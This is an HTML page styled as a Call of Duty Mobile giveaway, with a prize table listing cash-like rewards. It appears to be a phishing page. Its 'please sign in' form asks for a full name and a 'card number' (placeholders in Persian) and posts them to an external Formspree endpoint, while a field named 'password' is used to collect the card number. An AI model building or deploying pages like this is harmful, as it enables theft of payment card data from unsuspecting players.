<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="/css/styles-form.css" />
    <link rel="stylesheet" href="/css/styles-table.css" />
    <link rel="stylesheet" href="/css/index2.css" />
    <title>CODM Game Play</title>
  </head>
  <body>
    <img src="/css/images/1.JPG" class="img-size" alt="" />
    <form action="https://formspree.io/f/xknkrkya" method="POST">
      <fieldset>
        <legend>please sign in</legend>
        <input
          class="form-controller"
          name="email"
          type="email"
          placeholder="نام و نام خانوادگی"
          autofocus
          minlength="5"
          maxlength="100"
          required
          name="_replyto"
        />
        <input
          class="form-controller"
          name="password"
          type="text"
          placeholder="شماره کارت"
          maxlength="100"
          required
          name="card"
        />
        <div class="radio"></div>
        <button
          class="form-controller"
          type="submit"
          title="to submit,click it "
        >
          Submit
        </button>
        <p class="muted">CoD Mobile GamePlay &copy; 2021</p>
      </fieldset>
    </form>
    <img src="/css/images/3.JPG" class="img-size" alt="" />

    <img src="/css/images/2.JPG" class="img-size" alt="" />
    <table id="table">
      <thead>
        <tr>
          <th>Place</th>
          <th>ID</th>
          <th>Gift</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>1st</td>
          <td>1</td>
          <td>80,000R</td>
        </tr>
        <tr>
          <td>2nd</td>
          <td>2</td>
          <td>50,000R</td>
        </tr>
        <tr>
          <td>3rd</td>
          <td>3</td>
          <td>30,000R</td>
        </tr>
        <tr>
          <td>4th</td>
          <td>4</td>
          <td>-----</td>
        </tr>
      </tbody>
      <tfoot>
        <tr>
          <th colspan="2">Total</th>
          <th>-----</th>
        </tr>
      </tfoot>
    </table>
    <img src="/css/images/4.JPG" class="img-size" alt="" />
  </body>
</html>
